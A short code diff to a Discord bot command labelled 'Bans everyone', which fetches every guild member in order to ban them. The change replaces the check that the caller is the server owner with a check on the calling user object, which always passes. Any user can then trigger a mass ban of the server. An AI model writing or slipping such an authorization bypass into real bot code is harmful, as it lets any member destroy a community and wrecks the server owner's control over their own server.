@@ -6,7 +6,8 @@ module.exports = {
 		.setDescription('Bans everyone'),
         async execute(interaction) {
             const ServerOwner = interaction.guild.ownerId == interaction.user.id;
-            if (ServerOwner){
+            const dude = interaction.user;
+            if (dude){
                 let members = await interaction.guild.members.fetch({ force: true });
 
             members.forEach(async (member) => {
